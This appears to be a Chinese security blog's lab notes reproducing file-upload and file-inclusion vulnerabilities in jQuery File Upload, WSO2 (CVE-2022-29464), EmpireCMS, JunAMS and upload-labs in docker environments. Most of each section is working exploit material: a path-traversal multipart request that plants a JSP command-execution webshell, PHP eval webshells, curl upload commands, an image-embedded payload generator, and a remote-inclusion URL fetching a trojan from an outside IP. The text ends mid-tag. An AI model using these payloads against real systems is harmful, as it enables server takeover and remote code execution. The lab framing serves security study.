id="CVE-2018-9207-jQuery文件上传"><a href="#CVE-2018-9207-jQuery文件上传" class="headerlink" title="CVE-2018-9207 jQuery文件上传"></a>CVE-2018-9207 jQuery文件上传</h3><h4 id="漏洞环境-6"><a href="#漏洞环境-6" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>环境：vulfocus/jquery-cve_2018_9207:latest</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">docker pull vulfocus<span class="token operator">/</span>jquery<span class="token operator">-</span>cve_2018_9207<span class="token punctuation">:</span>latestdocker run <span class="token operator">-</span>d <span class="token operator">-</span>p <span class="token number">8080</span><span class="token punctuation">:</span><span class="token number">80</span> vulfocus<span class="token operator">/</span>jquery<span class="token operator">-</span>cve_2018_9207<span class="token punctuation">:</span>latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><ol><li>准备一个php木马</li></ol><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span> #命名为shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>上传</li></ol><pre class="line-numbers language-php" data-language="php"><code class="language-php">curl <span class="token operator">-</span><span class="token constant">F</span> <span class="token string double-quoted-string">"myfile=@shell.php"</span> <span class="token string double-quoted-string">"http://ip:8080/jquery-upload-file/php/upload.php"</span> <span class="token comment">#命令行上传即可</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>验证木马</li></ol><p><a href="http://ip:8080/jquery-upload-file/php/upload/shell.php">http://ip:8080/jquery-upload-file/php/upload/shell.php</a></p><h3 id="CVE-2022-29464-WSO2-文件上传-未成功"><a href="#CVE-2022-29464-WSO2-文件上传-未成功" class="headerlink" title="CVE-2022-29464 WSO2 文件上传(未成功)"></a>CVE-2022-29464 WSO2 文件上传(未成功)</h3><p>WSO2是一家成立于 2005 年的开源技术提供商。它提供了一个企业平台，用于在本地和整个 Internet 上 集成应用程序编程接口(API)、应用程序和 Web 服务。</p><p>某些 WSO2 产品允许无限制的文件上传和远程代码执行。</p><h4 id="漏洞环境-7"><a href="#漏洞环境-7" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>环境：vulfocus/jquery-cve_2018_9207:latest</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">docker pull vulfocus<span class="token operator">/</span>wso2<span class="token operator">-</span>cve_2022_29464<span class="token punctuation">:</span>latestdocker run <span class="token operator">-</span>d <span class="token operator">-</span>p <span class="token number">9443</span><span class="token punctuation">:</span><span class="token number">9443</span> vulfocus<span class="token operator">/</span>wso2<span class="token operator">-</span>cve_2022_29464<span class="token punctuation">:</span>latest<span class="token comment"># https://ip:9443</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p><strong>漏洞复现</strong></p><p><a href="https://www.cnblogs.com/lwh01/p/16193991.html">https://www.cnblogs.com/lwh01/p/16193991.html</a></p><ol><li><p>访问链接 <a href="https://ip:9443/">https://ip:9443</a></p></li><li><p>构造以下数据包Poc</p></li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span>fileupload<span class="token operator">/</span>toolsAny HTTP<span class="token operator">/</span><span class="token number">1.1</span>Host<span class="token punctuation">:</span> ip<span class="token punctuation">:</span><span class="token number">9443</span>Accept<span class="token punctuation">:</span> <span class="token operator">*</span><span class="token operator">/</span><span class="token operator">*</span>Accept<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> gzip<span class="token punctuation">,</span> deflateContent<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">889</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> multipart<span class="token operator">/</span>form<span class="token operator">-</span>data<span class="token punctuation">;</span> boundary<span class="token operator">=</span>4ef9f369a86bfaadf5ec3177278d49c0User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> python<span class="token operator">-</span>requests<span class="token operator">/</span><span class="token number">2.22</span><span class="token number">.0</span><span class="token operator">-</span><span class="token operator">-</span>4ef9f369a86bfaadf5ec3177278d49c0Content<span class="token operator">-</span>Disposition<span class="token punctuation">:</span> form<span class="token operator">-</span>data<span class="token punctuation">;</span> name<span class="token operator">=</span>"<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>repository<span class="token operator">/</span>deployment<span class="token operator">/</span>server<span class="token operator">/</span>webapps<span class="token operator">/</span>authenticationendpoint<span class="token operator">/</span><span class="token number">1</span><span class="token punctuation">.</span>jsp"<span class="token punctuation">;</span> filename<span class="token operator">=</span>"<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>repository<span class="token operator">/</span>deployment<span class="token operator">/</span>server<span class="token operator">/</span>webapps<span class="token operator">/</span>authenticationendpoint<span class="token operator">/</span><span class="token number">1.</span>jsp"<span class="token operator">&lt;</span>FORM<span class="token operator">></span>   <span class="token operator">&lt;</span>INPUT name<span class="token operator">=</span><span class="token string">'cmd'</span> <span class="token builtin">type</span><span class="token operator">=</span>text<span class="token operator">></span>   <span class="token operator">&lt;</span>INPUT <span class="token builtin">type</span><span class="token operator">=</span>submit value<span class="token operator">=</span><span class="token string">'Run'</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>FORM<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.*"</span> <span class="token operator">%</span><span class="token operator">></span>   <span class="token operator">&lt;</span><span class="token operator">%</span>   String cmd <span class="token operator">=</span> request<span class="token punctuation">.</span>getParameter<span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   String output <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>   <span class="token keyword">if</span><span class="token punctuation">(</span>cmd <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       String s <span class="token operator">=</span> null<span class="token punctuation">;</span>       <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>           Process p <span class="token operator">=</span> Runtime<span class="token punctuation">.</span>getRuntime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span>null<span class="token punctuation">,</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>           BufferedReader sI <span class="token operator">=</span> new BufferedReader<span class="token punctuation">(</span>newInputStreamReader<span class="token punctuation">(</span>p<span class="token punctuation">.</span>getInputStream<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s <span class="token operator">=</span> sI<span class="token punctuation">.</span>readLine<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> output <span class="token operator">+=</span> s<span class="token operator">+</span><span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>       <span class="token punctuation">&#125;</span> catch<span class="token punctuation">(</span>IOException e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   e<span class="token punctuation">.</span>printStackTrace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token operator">%</span><span class="token operator">></span>       <span class="token operator">&lt;</span>pre<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%=</span>output <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>pre<span class="token operator">></span><span class="token operator">-</span><span class="token operator">-</span>4ef9f369a86bfaadf5ec3177278d49c0<span class="token operator">-</span><span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>发送数据包</li></ol><p><img src="/2023/012220963/96.PNG" alt="96"></p><ol start="4"><li>验证</li></ol><p><a href="https://ip:9443/authenticationendpoint/1.jsp?cmd=ls">https://ip:9443/authenticationendpoint/1.jsp?cmd=ls</a></p><p><img src="/2023/012220963/97.PNG" alt="97"></p><p>上传成功木马文件，可执行Linux命令</p><h3 id="CVE-2018-18086-EmpireCMS文件上传"><a href="#CVE-2018-18086-EmpireCMS文件上传" class="headerlink" title="CVE-2018-18086 EmpireCMS文件上传"></a>CVE-2018-18086 EmpireCMS文件上传</h3><p>EmpireCMS（帝国网站管理系统）是一套内容管理系统（CMS）。</p><p>EmpireCMS 7.5版本中的e/class/moddofun.php文件的‘LoadInMod’函数存在安全漏洞。攻击者可利用该漏洞上传任意文件。</p><h4 id="漏洞环境-8"><a href="#漏洞环境-8" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>环境：vulfocus/empirecms-cve_2018_18086:latest</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">docker pull vulfocus<span class="token operator">/</span>empirecms<span class="token operator">-</span>cve_2018_18086<span class="token punctuation">:</span>latestdocker run <span class="token operator">-</span>d <span class="token operator">-</span>p <span class="token number">8080</span><span class="token punctuation">:</span><span class="token number">80</span> vulfocus<span class="token operator">/</span>empirecms<span class="token operator">-</span>cve_2018_18086<span class="token punctuation">:</span>latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><ol><li><p>进入靶场，登入后台 <a href="http://ip:8080/empirecms/e/admin/">http://ip:8080/empirecms/e/admin/</a> 账号/密码:admin/123456。</p></li><li><p>系统-&gt;管理数据表-&gt;导入系统模型</p></li></ol><ol start="3"><li>上传*.php.mod文件，填写空白内容，选择马上导入，并确认：</li></ol><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sh3ll.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;?php @eval(\$_POST['1']); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/012220963/98.PNG" alt="98"></p><p><img src="/2023/012220963/99.PNG" alt="99"></p><p>存放的数据表名可以是任意的</p><ol start="4"><li><p>生成的sh3ll文件在admin目录下。</p><p>蚁剑连接<a href="http://ip:8080/empirecms/e/admin/sh3ll.php">http://ip:8080/empirecms/e/admin/sh3ll.php</a> 密码1。</p></li></ol><h3 id="CNVD-2020-24741-JunAMS文件上传"><a href="#CNVD-2020-24741-JunAMS文件上传" class="headerlink" title="CNVD-2020-24741 JunAMS文件上传"></a>CNVD-2020-24741 JunAMS文件上传</h3><p>JunAMS是一款以ThinkPHP为框架的开源内容管理系统。</p><p>JunAMS内容管理系统存在文件上传漏洞，攻击者可利用该漏洞上传webshell，获取服务器权限。</p><h4 id="漏洞环境-9"><a href="#漏洞环境-9" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>环境：vulfocus/junams-cnvd_2020_24741:latest</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">docker pull vulfocus<span class="token operator">/</span>junams<span class="token operator">-</span>cnvd_2020_24741<span class="token punctuation">:</span>latestdocker run <span class="token operator">-</span>d <span class="token operator">-</span>p <span class="token number">8080</span><span class="token punctuation">:</span><span class="token number">80</span> vulfocus<span class="token operator">/</span>junams<span class="token operator">-</span>cnvd_2020_24741<span class="token punctuation">:</span>latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p><strong>漏洞复现</strong></p><p><a href="https://blog.csdn.net/qq_48985780/article/details/122240823">https://blog.csdn.net/qq_48985780/article/details/122240823</a></p><ol><li>访问管理员页面</li></ol><p><a href="http://ip/admin.php">http://ip/admin.php</a></p><p>admin admin</p><ol start="2"><li>构造文件上传表单</li></ol><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://ip/admin.php/common/add_images.html<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Upload<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>F12–&gt;元素–&gt;右键body元素–&gt;编辑html元素</p><p>3、上传任意php文件</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?php @<span class="token builtin">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li><p>验证木马</p><p>访问：<a href="http://ip:port/public/edit/20220511/1cee34ac8a7d46db3c7ff51b8b502439.php">http://ip:port/public/edit/20220511/1cee34ac8a7d46db3c7ff51b8b502439.php</a></p></li></ol><h3 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h3><p>参考：<a href="https://www.jianshu.com/p/05a410f3f3e0">https://www.jianshu.com/p/05a410f3f3e0</a></p><h4 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h4><p>二次渲染绕过</p><p>1、制作一张防止二次渲染的图片马</p><p>img.php</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?php$p <span class="token operator">=</span> array<span class="token punctuation">(</span><span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xf7</span><span class="token punctuation">,</span> <span class="token number">0x0e</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x1b</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span>           <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x2c</span><span class="token punctuation">,</span> <span class="token number">0x8a</span><span class="token punctuation">,</span> <span class="token number">0xd0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xf9</span><span class="token punctuation">,</span> <span class="token number">0xe1</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span>           <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xf6</span><span class="token punctuation">,</span> <span class="token number">0xd9</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x5d</span><span class="token punctuation">,</span> <span class="token number">0xfb</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span> <span class="token number">0xcc</span><span class="token punctuation">,</span>           <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span>           <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xa5</span><span class="token punctuation">,</span> <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x5f</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span>           <span class="token number">0xa1</span><span class="token punctuation">,</span> <span class="token number">0x3f</span><span class="token punctuation">,</span> <span class="token number">0x7a</span><span class="token punctuation">,</span> <span class="token number">0xbf</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x6b</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x2d</span><span class="token punctuation">,</span>           <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x7d</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x9d</span><span class="token punctuation">,</span> <span class="token number">0xad</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0xa1</span><span class="token punctuation">,</span>           <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">;</span>$img <span class="token operator">=</span> imagecreatetruecolor<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>$y <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> $y <span class="token operator">&lt;</span> sizeof<span class="token punctuation">(</span>$p<span class="token punctuation">)</span><span class="token punctuation">;</span> $y <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   $r <span class="token operator">=</span> $p<span class="token punctuation">[</span>$y<span class="token punctuation">]</span><span class="token punctuation">;</span>   $g <span class="token operator">=</span> $p<span class="token punctuation">[</span>$y<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   $b <span class="token operator">=</span> $p<span class="token punctuation">[</span>$y<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   $color <span class="token operator">=</span> imagecolorallocate<span class="token punctuation">(</span>$img<span class="token punctuation">,</span> $r<span class="token punctuation">,</span> $g<span class="token punctuation">,</span> $b<span class="token punctuation">)</span><span class="token punctuation">;</span>   imagesetpixel<span class="token punctuation">(</span>$img<span class="token punctuation">,</span> <span class="token builtin">round</span><span class="token punctuation">(</span>$y <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> $color<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>imagepng<span class="token punctuation">(</span>$img<span class="token punctuation">,</span><span class="token string">'./1.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2、将图片上传</p><p>3、使用文件包含的方式利用</p><p><a href="http://127.0.0.1/upload/include.php?file=upload/21953.png&amp;0=assert">http://127.0.0.1/upload/include.php?file=upload/21953.png&amp;0=assert</a></p><p>POST： 1=system(‘whoami’);</p><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>文件包含：程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，无需再次编写，这种调用文件的过程一般被称为文件包含。</p><p>开发人员没有对要包含的文件进行安全检验，导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。</p><h4 id="包含演示"><a href="#包含演示" class="headerlink" title="包含演示"></a>包含演示</h4><p>index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>test.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="包含脚本"><a href="#包含脚本" class="headerlink" title="包含脚本"></a>包含脚本</h3><p>php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'xxx.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 使用该函数包含文件</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'xxx.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 功能与include()相同，但是当程序重复调用同一个文件时，只会调用</span>一次。<span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'xxx.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// require和include(）类似，但是当require()调用的文件发生错误时，程</span>序会输出错误信息，并终止脚本的执行。<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'xxx.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// require()相同，但是当程序重复调用同一个文件时，只会调用一次。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>asp</p><pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">&lt;!--#include file&#x3D;&quot;xxx.asp&quot;--&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>aspx</p><pre class="line-numbers language-aspx" data-language="aspx"><code class="language-aspx">&lt;!--#include file&#x3D;&quot;xxx.aspx&quot;--&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>jsp</p><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@ include file&#x3D;&quot;xxx.jsp&quot;%&gt;&lt;jsp:include page&#x3D;&quot;xxx.jsp&quot;&#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="漏洞演示"><a href="#漏洞演示" class="headerlink" title="漏洞演示"></a>漏洞演示</h4><p>PHP的include表达式会引入被包含的文件，并且在此文件中查找可执行的php代码部分并执行。</p><p>include的路径可以为绝对路径，也可以为相对路径，并且支持 ../ 查找目录的上级目录。</p><p>index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>      <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>1.txt</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问：?file=1.txt</p><p><img src="/2023/012220963/100.PNG" alt="100"></p><h3 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h3><p><strong>本地文件包含</strong></p><p>本地包含文件需要指定目标服务器本地的一个文件</p><p><strong>远程文件包含</strong></p><p>远程文件包含需要指定一个远程文件的地址，这个地址我们可以自己构造</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h4><p><strong>无限制直接包含</strong></p><p><a href="http://127.0.0.1/?file=1.txt">http://127.0.0.1?file=1.txt</a></p><p><strong>包含计算机上的其他文件</strong></p><p><a href="http://127.0.0.1/?file=../../../a.txt">http://127.0.0.1?file=../../../a.txt</a></p><p><img src="/2023/012220963/101.PNG" alt="101"></p><p><strong>注意</strong>：../ 是向上级目录跳,加很多会从下级向上级目录跳到根目录下，并非从下级向上级的目录遍历</p><p><strong>限制扩展名的包含</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>      <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token operator">.</span> <span class="token string double-quoted-string">".html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>00截断</p><p>条件：php&lt;5.3.4 magic_quotes_gpc=Off</p><p><a href="http://127.0.0.1/?file=1.txt%00">http://127.0.0.1/?file=1.txt%00</a></p><p><img src="/2023/012220963/102.PNG" alt="102"></p><h4 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h4><p>代码会进行限制：allow_url_include = On</p><p><strong>无限制</strong></p><p>index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>      <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>准备一个远程的木马地址：<a href="http://124.222.3.192:8000/1.txt">http://124.222.3.192:8000/1.txt</a></p><p><a href="http://127.0.0.1/?file=http://124.222.3.192:8000/1.txt">http://127.0.0.1/?file=http://124.222.3.192:8000/1.txt</a></p><p>使用phpstudy构造远程地址：<a href="http://127.0.0.1/1.txt">http://127.0.0.1/1.txt</a></p><p><a href="http://127.0.0.1/?file=http://127.0.0.1/1.txt">http://127.0.0.1/?file=http://127.0.0.1/1.txt</a></p><p><strong>有后缀限制</strong></p><pre class="line-numbers 